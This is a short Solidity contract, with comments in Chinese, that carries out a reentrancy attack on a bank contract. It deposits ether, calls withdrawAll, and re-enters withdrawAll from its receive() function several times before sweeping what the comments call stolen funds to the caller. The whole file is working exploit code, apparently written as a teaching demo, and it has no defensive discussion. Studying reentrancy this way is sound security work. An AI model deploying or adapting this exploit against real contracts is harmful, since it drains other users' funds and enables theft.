// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

//攻击者

interface IVulnerableBank {
    function deposit() external payable;
    function withdrawAll() external;
    function balances(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableBank public bank;
    uint256 public attackCount = 0; // 记录重入次数

    constructor(address _bankAddress) {
        bank = IVulnerableBank(_bankAddress);
    }

    // 1. 先存钱（让银行有钱可偷）
    function depositToBank() external payable {
        bank.deposit{value: msg.value}();
    }

    // 2. 发起攻击！
    function attack() external {
        require(bank.balances(address(this)) > 0, "Need to have balance first");
        bank.withdrawAll(); // 触发漏洞
    }

    // 3. fallback 被触发时，自动再次提款（重入！）
    receive() external payable {
        attackCount++;
        if (attackCount <= 3 && address(bank).balance >= 1 ether) {
            bank.withdrawAll(); // 再次调用 withdrawAll()
        }
    }

    // 4. 提走所有偷来的钱
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // 查看本合约余额
    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }
}